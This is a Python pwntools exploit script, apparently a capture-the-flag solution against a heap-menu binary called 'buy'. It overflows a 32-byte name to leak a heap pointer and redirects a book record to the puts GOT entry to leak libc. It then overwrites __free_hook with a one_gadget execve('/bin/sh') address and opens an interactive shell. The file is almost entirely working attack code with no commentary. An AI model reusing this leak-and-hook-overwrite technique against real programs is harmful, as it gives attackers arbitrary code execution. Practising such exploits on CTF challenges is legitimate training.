#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = "buy"
libcFileName = ""
ip = ""
port = 0

Debug = 1
if Debug:
    io = process(elfFileName)
else:
    io = remote(ip,port)
#elf = ELF(elfFileName)
def writename(name):
	io.recvuntil("(1~32):")
	io.sendline(name)

def namechange(name):
	io.recvuntil("Your choice:")
	io.sendline("6")
	io.recvuntil("(1~32):")
	io.sendline(name)

def add(name_size,name,des_size,des):
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(".")
	io.sendline(str(name_size))
	io.recvuntil(".")
	io.sendline(name)
	io.recvuntil(".")
	io.sendline(str(des_size))
	io.recvuntil(".")
	io.sendline(des)

def displayall():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil(32*"a")
	#io.recvuntil('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1
	book1_addr = io.recvuntil("\'s",drop=True)
	book1_addr = book1_addr.ljust(8,'\x00')
	book1_addr = u64(book1_addr)
	#print hex(book1_addr)
	#io.recvuntil("des address is ")

	return book1_addr

def change(index,name,desrcript):
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("index is ")
	io.sendline(str(index))
	io.recvuntil("y's name.\n")
	io.sendline(name)
	io.recvuntil("y's desrcription.")
	io.sendline(desrcript)

def displayall_getdump():
	io.recvuntil("Your choice:")
	io.sendline("3")
	io.recvuntil("Your choice:")
	io.sendline("1")
	io.recvuntil("name is ")
	addr = io.recvuntil("\n",drop=True)
	addr = addr.ljust(8,'\x00')
	addr = u64(addr)
	#io.recvuntil("des address is ")
	return addr

def make_empty(index):
	io.recvuntil("Your choice:")
	io.sendline("5")
	io.recvuntil("Your choice:")
	io.sendline("2")
	io.recvuntil("The index is ")
	io.sendline(str(index))


#get the first heap address
writename("a"*32)
add(4200,"spring",12,"aaa")
add(16,"hello",16,"hello")
first_heap_addr = displayall()
print '[*] first_heap_addr is ' + hex(first_heap_addr) 
#first_heap_addr = 0x605040
'''
int name_size;
char *name;
int des_size;
char *desrcript;	
'''
#get dump test
displayall()
#first heap pre_size size 0x10
offset = 4096 - 16
print '[*] offset is ' + hex(offset)

puts_got = 0x603028
printf_got = 0x603040


payload_got_get = offset *'c' + p64(20) + p64(puts_got) + p64(20) + p64(first_heap_addr+0x78)
#payload_des_dump = 0xfff * 'c'
#pause()
change(0,"spring",payload_got_get)
namechange("a"*32)
#gdb.attach(io)
puts_addr = displayall_getdump()
print '[*] puts_addr is ' + hex(puts_addr)

#find libc
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
freehook_addr = libc_base + libc.dump('__free_hook')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print '[*] freehook_addr is ' + hex(freehook_addr)
print '[*] system_addr is ' + hex(system_addr)
print '[*] binsh_addr is ' + hex(binsh_addr)
''' onegadget
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = libc_base + 0x4526a
print '[*] one_gadget is ' + hex(one_gadget)

change(0,p64(puts_addr),p64(freehook_addr))
change(1,p64(one_gadget),p64(system_addr))

make_empty(1)

io.interactive()
